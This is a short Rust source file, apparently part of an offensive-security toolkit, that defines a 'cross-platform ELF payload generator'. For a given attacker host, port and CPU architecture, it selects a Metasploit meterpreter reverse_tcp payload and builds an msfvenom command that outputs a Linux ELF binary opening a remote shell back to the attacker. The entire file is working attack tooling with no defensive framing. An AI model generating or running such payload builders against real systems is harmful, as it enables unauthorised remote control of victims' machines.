// Cross-platform ELF payload generator
use crate::cli::banner;

pub struct CrossElfGenerator;

impl CrossElfGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str, arch: &str) -> String {
        banner::print_exploiting("CROSS-ELF", &format!("{}:{}", lhost, lport));
        
        let payload_type = match arch {
            "x64" => "linux/x64/meterpreter/reverse_tcp",
            "x86" => "linux/x86/meterpreter/reverse_tcp",
            "arm" => "linux/armle/meterpreter/reverse_tcp",
            "aarch64" => "linux/aarch64/meterpreter/reverse_tcp",
            _ => "linux/x64/meterpreter/reverse_tcp",
        };
        
        format!(
            "msfvenom -p {} LHOST={} LPORT={} -f elf -o payload_{}.elf",
            payload_type, lhost, lport, arch
        )
    }
}
